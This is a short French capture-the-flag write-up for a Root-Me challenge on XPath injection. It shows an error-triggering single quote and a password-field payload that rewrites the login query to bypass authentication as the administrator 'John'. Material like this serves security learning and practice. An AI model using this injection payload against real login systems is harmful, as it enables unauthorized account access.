# XPath injection - authentification

La page du [challenge](http://challenge01.root-me.org/web-serveur/ch23/)

## Analyse

On commence par cherche une vulnérabilité, dans ce cas sur les champs d'authentification de l'onglet Login.
```
Username:'
Password:

Warning: SimpleXMLElement::xpath(): Invalid predicate in ...
```

Dans l'onglet, on remarque aussi une liste de membre, et la présence d'un administrateur, John.

## Attaque

La syntaxe classique d'une requête est : `//user[username='---' and password='---']"`. On doit s'arranger pour bypass cette authentification sous _John_. Pour cela, on va mettre une variable quelconque dans le champs _Username_. Dans le champs _Password_, on va s'arranger pour ajouter une nouvelle recherche qui seras toujours vrai, en sélectionnant John.

```
Username: batman
Password: ' and '1'='1' or username='John

//user[username='batman' and password='' or '1'='1' and username='John']
```
